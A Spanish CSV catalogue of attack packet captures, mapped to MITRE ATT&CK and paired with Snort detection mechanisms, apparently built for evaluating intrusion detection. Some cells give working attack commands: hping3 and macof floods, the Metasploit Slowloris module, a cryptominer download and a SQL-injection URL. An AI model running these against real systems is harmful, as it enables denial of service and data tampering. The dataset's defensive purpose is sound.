TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Command and Control,-,TA0040,Remote Access Software,T1219,-,-,Uso de TeamViewer para establecer canal de comunicación alternativo,TeamViewer,T1219-RemoteAccessSoftwareNAT_[5].pcapng,TCP,145,1,0,8,8,8,0,-,SI,Regla genérica que detecte el uso de la herramienta TeamViewer para obtener el control del software víctima de forma remota,Conexion mediante TeamViewer entre dos equipos,Manual [5] / 4.8.3,Manual [5] / C.7,Manual [5] / 5.11.9,1,1,0,1,0,1,LV2,"Dependiendo de las circunstancias, el uso de un software de acceso remoto puede ser tráfico legitimo",L3,1,1
Defense Evasion,-,TA0005,Template Injection,T1221,-,-,Inyectar un fichero mediante Phishing .docx con macros modificadas que permita pasar desapercibido,Sitios web convencionales (Gmail),T1221-Template_Injection_[5].pcapng,-,12,1,1,1,2,1,1,Establecimiento de sesión remota mediante Metasploit - T1059,SI,"Regla genérica que detecte la inyección de macros o plantillas para llevar a cabo un ataque de Phishing, usando como medio mecanismos convencionales de comunicación (mensajes SMTP, por ejemplo)","Modificación de fichero .docx para, mediante macros, provocar la descarga y ejecución de malware en el equipo víctima",Manual [5] / 4.4.1,Manual [5] / C.8,Manual [5] / 5.6.5,1,1,0,1,0,1,LV2,El tráfico puede parecer ser legítimo en una inyección de plantilalas (.DOTM),L3,1,1
Discovery,-,TA0007,Domain Trust Discovery,T1482,-,-,Descubrimiento de dominios de confianza en entorno Active Directory,dsquery,T1482-Domain_trust_discovery_[4].pcapng,LDAP,4,1,0,1,1,1,0,-,NO*,"Regla personalizada que detecte paquetes LDAP, procedentes de equipos que no son DC en la red (configurable manualmente) y con la cadena objectClass=trustedDomain",-,Manual [4] / 3.13,Manual [4] / B.13,Manual [4] / 4.13,1,1,0,1,0,1,LV2,El descubrimiento de dominios de confianza puede ser una actividad legítima,L3,1,0
Impact,-,TA0040,Defacement,T1491,Internal Defacement,T1491.001,Modificar fondo de pantalla equipo victima,PowerShell,T1491.001-Internal_Defacement_[5].pcapng,TCP,12,1,1,1,2,1,1,Establecimiento de sesión remota mediante Metasploit - T1059,NO,Detectable por listas negras/anomalías,Modificar fondo de pantalla equipo victima,Manual [5] / 4.10.1,Manual [5] / C.9,Manual [5] / 5.13.1,1,1,0,1,0,1,LV2,Esta acción puede considerarse tráfico legítimo,L3,1,0
Impact,-,TA0040,Resource Hijacking,T1496,-,-,Descarga y puesta en marcha de software de criptominado,XMRIG,T1496-Cryptomining_[2].pcapng,-,13,1,0,1,1,1,0,-,NO,Detección por anomalías,Instalacion y uso de software de minado. Comando: wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz,Manual [2] / 3.3.2.1,Manual [5] / C.26,Manual [2] / 4.2.2.3,1,1,0,1,0,1,LV1,El uso de un software de criptominado siempre se considera como un ataque,L3,1,0
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Amplificación DNS,dnsdrdos,T1498-Amplif_dns_[1].pcapng,DNS,5180,5173,1,5173,5173,5173,0,,SI,Regla genérica que detecte un envío masivo de respuestas DNS no solicitadas con un mismo nombre resuelto hacia la red protegida,-,Manual [1] / 3.5.1,Manual [1] / E.14,Manual [4] / 4.1.35 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Siempre se considera como ataque la amplificacion DNS,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Fraggle,hping3,T1498-Fraggle_[1].pcapng,Chargen,1426,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de datagramas UDP hacia un puerto concreto, con fin de saturarlo y causar su inoperatividad",-,Manual [1] / 3.4.5,Manual [1] / E.13,Manual [4] / 4.1.36 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Smurf,hping3,T1498-Smurf_[1].pcapng,ICMP,4,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de respuestas ICMP,-,Manual [1] / 3.3.1,Manual [1] / E.7,Manual [4] / 4.1.37 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,-,-,Inundación de TCBPDU,yersinia,T1498-Tcbpdu_[1].pcapng,STP,57229,1,0,1,1,1,0,-,NO,Fuera del alcance del estudio,-,Manual [1] / 3.2.2,Manual [1] / E.5,Manual [4] / 4.1.38 y Manual [5] / 5.13.3,1,0,0,1,1,1,LV1,Un ataque de inundación siempre se considera como tal,L2 (Switch),0,0
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación HTTP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-HTTP_flood-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte envío masivo de mensajes HTTP,-,Dataset CIC-2018,Manual [4] / B.37,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación tabla MAC,Macof,T1498.001-MAC_table_flood_[3].pcapng,IPv4,1,1,0,1,1,1,0,-,NO,-,Inundacion tabla MAC mediante Macof. Comando: sudo macof -i enp0s9 -d 172.16.1.1,Manual [3] / 3.8.18,Manual [5] / C.27,Manual [3] / 3.18.5 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L2 (Switch),0,0
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación TCP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-TCP_flood-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte envío masivo de mensajes TCP,-,Dataset CIC-2018,Manual [4] / B.37,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Caldera, hping3",T1498.001-UDP_flood_[2].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,Inundacion UDP en la red de la víctima. Comando: timeout 10s hping3 --udp --flood 192.168.2.2,Manual [2] / 3.1.10.2,Manual [2],Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-UDP_flood_1-C2018_[6].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,-,Dataset CIC-2018,Manual [5] / C.28,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-UDP_flood_2-C2018_[6].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,-,Dataset CIC-2018,Manual [5] / C.28,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Inundación DHCP / Inanición,"DHCPig, yersinia",T1499-Dhcp_flood_[1].pcapng,DHCP,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK)",-,Manual [1] / 2.4.2.1.1,Manual [1] / E.18,Manual [4] / 4.1.39 y Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,El aagotamiento del pool de direcciones de un servidor DHCP siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,LAND,hping3,T1499-Land_[1].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte envío de mensajes TCP SYN procedentes de la misma dirección IP a la que van dirigidos los paquetes. Los puertos origen/destino pueden ser incluso idénticos,-,Manual [1] / 2.3.1.1.5,Manual [1] / E.11,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application or System Exploitation,T1499.004,Suplantación MAC,ip,T1499-Mac_spoof_[1].pcapng,ARP,3,1,0,1,1,1,0,-,SI,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1],Manual [1] / E.2,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,La suplantacion MAC siempre se considera como un ataque,L2 (Switch),0,0
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Reflexión SYN-ACK,hping3,T1499-Reflexion_synack_[1].pcapng,TCP,953,952,0,952,952,952,0,-,SI,Regla que detecte el envío de mensajes TCP SYN-ACK no solicitados previamente por el la red a proteger,-,Manual [1] / 3.4.2,Manual [1] / E.10,Manual [5] / 5.13.2,1,1,0,1,0,0,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Reseteo de Conexión,"ettercap, netwox, nping",T1499-Reseteo_[1].pcapng,TCP,3,1,0,1,1,1,0,-,NO,Detección por anomalías que identifique reseteos de conexión periódicos y desde direcciones sospechosas,-,Manual [1] / 2.3.1.1.6,Manual [1] / E.12,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,Inundación SYN con suplantación,hping3,T1499-Syn_suplantacion_[1].pcapng,TCP,2334,2332,0,2332,2332,2332,0,-,SI,Regla genérica que detecte el envío prolongado de mensajes TCP SYN que dejan los sockets del equipo a proteger en estado SYN-RECV (no se terminan los handshake de las conexiones TCP establecidas),-,Manual [1] / 2.3.1.1.3,Manual [1] / E.9,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,Denegación de servicio a servidor web,Metasploit,T1499.001-OS_Exhaustion_Flood_[3].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el uso de Slowloris para realizar ataque DDos mediante la comprobación de campos de bytes típicos de la herramienta,Uso de metasploit para ataque DoS con herramienta Slowloris. Comando: use auxiliary/dos/http/slowloris,Manual [3] / 3.8.16,Manual [3] / 3.8.16.4,Manual [3] / 3.8.16.5 y Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Envio solicitudes HTTP a baja tasa,Slowhttptest,T1499.02-Slowhttptest-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes HTTP a baja tasa,Uso de Slowhttptest para denegación de servicio a servidor web,Dataset CIC-2018,Manual [5] / C.29,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Envio solicitudes HTTP parciales,Slowloris,T1499.02-Slowloris-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes HTTP parciales o uso de Slowloris,Uso de Slowloris para denegación de servicio a servidor web,Dataset CIC-2018,Manual [5] / C.29,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application Exhaustion Flood,T1499.003,Denegación de servicio a servidor web,GoldenEye,T1499.03-GoldenEye-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Reglas que detecen envío masivo de solicitudes a servidor web,Uso de GoldenEye para denegación de servicio a servidor web,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application Exhaustion Flood,T1499.003,Denegación de servicio a servidor web,Hulk,T1499.03-Hulk-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Reglas que detecen envío masivo de solicitudes a servidor web,Uso de Hulk para denegación de servicio a servidor web,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Persistence,-,TA0003,Server Software Component,T1505,SQL Stored Procedures,T1505.001,Inyección SQL,None (SQL injection using URL),T1505.001-SQL_inyection_[3].pcapng,HTTP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un intento de inyección SQL insertada en la URL de acceso a una página web, o en su defecto en algunos de los campos de las peticiones","""Ejecución de URL en navegador web (http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20INSERT%20INTO%20contactos%20values%20(3,%20%27Atacante%27,%20%27Atacante%27,%20%27Atacante%27,%20100)--)""",Manual [3] / 3.8.7,Manual [3] / 3.8.7.4 y Manual [5] / C.30,Manual [3] / 3.8.7.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Persistence,-,TA0003,Server Software Component,T1505,Web Shell,T1505.003,Shell Web,Metasploit,T1505.005-Shell_Web_[2].pcapng,HTTP,3,1,0,1,1,1,0,-,SI,Regla genérica que detecta el intento de escaneo para comprobar la existencia de backdoor.,"El ataque busca aprovechar configuracion vulnerable de un servidor WampServer que permite subir y borrar contenido web mediante el uso de HTTP PUT y HTTP DELETE.
Se realiza la subida de un payload a un servidor web",Manual [2] / 3.1.5.1,Manual [5] / C.31,-,1,1,0,1,0,1,LV1,La creación de un Shell Remoto haciendo uso de una conexión web siempre es un ataque,L3,1,1
Lateral Movement,-,TA0008,Internal Spear-phishing,T1534,-,-,Phishing interno entre equipos pertenecientes a un dominio con servidor de correo habilitado,"MailEnabler, Thunderbird",T1534-Internal_spearphishing_[4].pcapng,SMTP,10,1,0,1,1,1,0,-,NO,"Detección por anomalías, análisis de la estructura de correos electrónicos, petición de información confidencial, etc",-,Manual [4] / 3.14,Manual [4] / B.14,Manual [4] / 4.14,1,1,0,1,0,1,LV2,"El Phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima",L3,0,0
Exfiltration,-,TA0010,Transfer Data to Cloud Account,T1537,-,-,Transferir archivos de una cuenta a otra mediante un servicio en la nube,OneDrive,T1537-Transfer_Data_to_Cloud_Account_[5].pcapng,TCP,76,2,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Transferir entre dos cuentas en la nube unos ficheros,Manual [5] / 4.9.2,Manual [5] / C.10,Manual [5] / 5.12.6,1,1,0,1,0,1,LV2,Transferir datos a la nube puede considerarse tráfico legítimo o ataque dependiendo de las circunstancias,L3,1,1
Persistence,Defense Evasion,TA0003,Pre-OS Boot,T1542,TFTP Boot,T1542.005,Modificación de imagen de SO mediante la suplantación de un Server TFTP,SSH,T1542.005-TFTP_Boot_[5].pcapng,TFTP,17,1,0,1,1,1,0,-,NO***,**Regla personalizada que comprueba si la IP del servidor TFTP es la del servidor legítimo ** Que el SO enviado por el atacante contenga algun tipo de malware detectable por un IDS,Servidor TFTP utilizando Iventoy,Manual [5] / 4.3.2,Manual [5] / C.11,Manual [5] / 5.5.3,1,1,0,1,0,1,LV1,El arranque mediante TFTP desde otro servidor TFTP siempre se considera como un ataque,L3,1,0
Persistence,Privilege Escalation,TA0003,Create or Modify System Process,T1543,Windows Service,T1543.003,Creación o modificación de servicio de Windows para garantizar la persistencia,Metasploit,T1543.003-CreateSystemProcessWindowsService_[5].pcapng,TCP,3,1,1,1,3,1,2,Establecimiento de sesión remota mediante Metasploit - T1059,NO,Detección por anomalías,Crear servicio Windows para garantizar persistencia,Manual [5] / 4.3.4,Manual [5] / C.43,Manual [5] / 5.5.6,1,1,0,1,0,1,LV2,La creacion de un servicio de Windows puede considerarse como tráfico legítimo pero tambien como un ataque dependiendo. Esta accion podria realizarla un administrador de red o un atacante,L3,1,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Suplantación ARP,arpspoof,T1557-Arp_spoof_[1].pcapng,ARP,2,1,0,1,1,1,0,-,SI*,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1] / 3.2,Manual [1] / E.3,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La suplantacion ARP siempre es un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,DHCP Spoofing,T1557.003,DHCP Spoofing,"DHCPig, servidor DHCP",T1557-Dhcp_spoofing_[1].pcapng,DHCP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK). Otra alternativa es una regla personalizada que analice mensajes DHCP ACK con direcciones IP de servidores DNS distinta a la establecida en la red",-,Manual [1] / 2.4.2.1.2,Manual [1] / E.19,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,DHCP Spoof siempre se considera como un ataque,L3,0,1
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Agujero 196,ettercap,T1557-Hole196_[1].pcapng,ARP,3,1,0,1,1,1,0,-,SI,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1] / 2.1.2.1.1,Manual [1] / E.28,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,Un ataque de agujero 196 siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,-,-,Suplantación del puente raíz,yersinia,T1557-Puente_raiz_[1].pcapng,STP,6,1,0,1,1,1,0,-,NO**,"Si el ataque viene seguido de suplantaciones ARP, con el uso de preprocesadores de Snort resulta posible su detección. En caso de que el ataque se centre únicamente en el establecimiento del atacante como puente raíz, no existe mecanismo de detección",Establecimiento de atacante como puente raíz,Manual [1] / 2.1.4.1.2,Manual [1] / E.6,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La suplantacion de un puente raiz siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,-,-,Redirección,"ettercap, netwox",T1557-Redireccion_[1].pcapng,ARP,2,1,0,1,1,1,0,-,NO**,Regla personalizada que detecte envío de paquetes ICMP Redirect por parte de un equipo que no debería intervenir en labores de redirección,-,Manual [1] / 2.2.2.1.3,Manual [1] / E.8,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La dredireccion siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Envenenamiento ARP,Arpspoof,T1557.002-ARP_poisoning1_[2].pcapng,ARP,13,1,0,1,1,1,0,-,NO,-,Envenenamiento de tablas ARP mediante Arpspoof.,Manual [2] / 3.4.1.1,Manual [5] / C.32,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,El envenamiento ARP siempre es un ataque,L2 (Switch),0,0
